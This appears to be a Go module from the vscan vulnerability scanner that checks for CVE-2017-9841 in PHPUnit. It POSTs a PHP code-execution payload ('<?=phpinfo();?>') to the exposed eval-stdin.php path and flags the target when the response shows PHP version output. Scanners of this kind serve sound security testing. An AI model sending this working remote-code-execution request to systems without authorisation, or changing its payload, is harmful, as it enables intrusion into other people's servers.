package phpunit

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func CVE_2017_9841(url string) bool {
	if req, err := pkg.HttpRequset(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", "<?=phpinfo();?>", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln phpunit CVE_2017_9841\n"))
			return true
		}
	}
	return false
}
